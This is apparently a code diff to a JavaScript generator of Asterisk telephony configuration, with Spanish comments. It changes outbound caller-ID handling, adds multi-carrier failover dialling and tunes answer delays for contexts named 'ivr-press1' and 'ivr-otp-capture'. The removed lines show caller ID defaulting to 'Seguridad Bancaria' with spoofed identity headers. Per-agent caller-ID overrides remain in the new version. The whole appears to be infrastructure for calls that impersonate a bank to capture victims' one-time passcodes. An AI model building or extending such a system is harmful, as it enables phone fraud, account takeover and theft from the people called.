@@ -164,8 +164,7 @@ send_pai=yes
 send_rpid=${c.sendrpid || 'yes'}
 trust_id_outbound=yes
 trust_id_inbound=${c.trustrpid || 'yes'}
-from_user=${c.username || 'user'}
-callerid=${c.outboundCallerId || '"" <>'}
+${c.fromuser ? `from_user=${c.fromuser}\n` : ''}callerid=${c.outboundCallerId || '"" <>'}
 
 [${slug}_auth]
 type=auth
@@ -240,29 +239,45 @@ exten => 3333,1,Goto(ivr-otp-live-3333,s,1)
 exten => 333,1,Goto(ivr-otp-live-3333,s,1)
 
 ; ------------------------------------------------------------------------------
-; DIALPLAN ENTRY (extensions.conf) - RUTAS SALIENTES POR TRONCAL CARRIER
+; DIALPLAN ENTRY (extensions.conf) - RUTAS SALIENTES MULTI-CARRIER FAILOVER
 ; ------------------------------------------------------------------------------
-${activeCarriers
-  .map((c) => {
-    const slug = c.name.toLowerCase().replace(/[^a-z0-9]/g, '_');
-    const pattern = c.dialplanPattern || '_1XXXXXXXXXX';
-    const flags = c.dialFlags || 'Tor';
-    return `; Dialplan Entry: ${c.name}
-exten => ${pattern},1,NoOp(--- Llamada Saliente PJSIP a \${EXTEN} via ${slug} ---)
+exten => _1XXXXXXXXXX,1,NoOp(=== [OUTBOUND] Marcacion 11 digitos USA/Canada/RD ===)
  same => n,Set(CALLING_AGENT=\${CALLERID(num)})
  same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
  same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${c.outboundCallerId || '+18005550199'}))
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=${c.name || 'Seguridad Bancaria'}))
- same => n,Set(CALLERID(pres)=allowed_passed_screen)
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}))
+ same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}))
  same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
- same => n,Set(PJSIP_HEADER(add,Privacy)=none)
- same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${c.host}>)
- same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${c.host}>;party=calling;screen=yes;privacy=off)
- same => n,Dial(PJSIP/${slug}/sip:\${EXTEN}@${c.host}:${c.port || 5060},,${flags})
- same => n,Hangup()`;
+ same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${OUTBOUND_CARRIER}))
+ same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${DB(ivr_vars/\${EXTEN}_carrier)}))
+ same => n,ExecIf($["\${ASSIGNED_CARRIER}" = ""]?Set(ASSIGNED_CARRIER=\${DB(user_carrier/\${CALLING_AGENT})}))
+ same => n,GotoIf($["\${ASSIGNED_CARRIER}" = "" || "\${ASSIGNED_CARRIER}" = "auto" || "\${ASSIGNED_CARRIER}" = "pool"]?pool_outbound)
+${activeCarriers
+  .map((c) => {
+    const slug = c.name.toLowerCase().replace(/[^a-z0-9_]/g, '_');
+    return ` same => n,GotoIf($["\${TOLOWER(\${ASSIGNED_CARRIER})}" != "${slug}"]?skip_${slug})
+ same => n,Dial(PJSIP/\${EXTEN}@${slug},40,Tt)
+ same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER" || "\${DIALSTATUS}" = "BUSY"]?end_outbound)
+ same => n,Dial(PJSIP/${slug}/sip:\${EXTEN}@${c.host}:${c.port || 5060},30,Tt)
+ same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER" || "\${DIALSTATUS}" = "BUSY"]?end_outbound)
+ same => n(skip_${slug}),NoOp()`;
   })
-  .join('\n\n')}
+  .join('\n')}
+ same => n(pool_outbound),NoOp(=== [POOL] Iniciando conmutacion secuencial entre troncales ===)
+${activeCarriers
+  .map((c, idx) => {
+    const slug = c.name.toLowerCase().replace(/[^a-z0-9_]/g, '_');
+    return ` same => n,NoOp(=== Intentando troncal ${idx + 1}/${activeCarriers.length}: ${slug} ===)
+ same => n,Dial(PJSIP/\${EXTEN}@${slug},40,Tt)
+ same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER" || "\${DIALSTATUS}" = "BUSY"]?end_outbound)
+ same => n,Dial(PJSIP/${slug}/sip:\${EXTEN}@${c.host}:${c.port || 5060},30,Tt)
+ same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER" || "\${DIALSTATUS}" = "BUSY"]?end_outbound)`;
+  })
+  .join('\n')}
+ same => n(end_outbound),Hangup()
+
+exten => _XXXXXXXXXX,1,NoOp(Normalizando 10 digitos a 11 digitos)
+ same => n,Goto(from-internal,1\${EXTEN},1)
 
 ; ------------------------------------------------------------------------------
 ; CONTEXTO TRONCAL / ENTRANTES
@@ -283,7 +298,7 @@ exten => _X.,1,NoOp(Llamada entrante trunkinbound: \${CALLERID(all)})
 [ivr-press1]
 exten => s,1,NoOp(=== INICIO IVR PRESS 1 ===)
  same => n,Answer()
- same => n,Wait(${press1.answerDelaySeconds ?? 1.5})
+ same => n,Wait(${press1.answerDelaySeconds ?? 3})
  same => n,Set(LOOP_COUNT=0)
 
  same => n(menu),Set(LOOP_COUNT=$[\${LOOP_COUNT} + 1])
@@ -341,7 +356,7 @@ exten => s,n(timeout_hangup),NoOp(Intentos maximos superados)
 [ivr-otp-capture]
 exten => s,1,NoOp(=== INICIO CAPTURA DE OTP ===)
  same => n,Answer()
- same => n,Wait(${otp.answerDelaySeconds ?? 1.5})
+ same => n,Wait(${otp.answerDelaySeconds ?? 3})
  ; Si ARI esta activo, entrega el canal a la aplicacion Stasis
  same => n,Stasis(${otp.stasisAppName})
  ; Si Stasis no responde, ejecutar el fallback nativo:
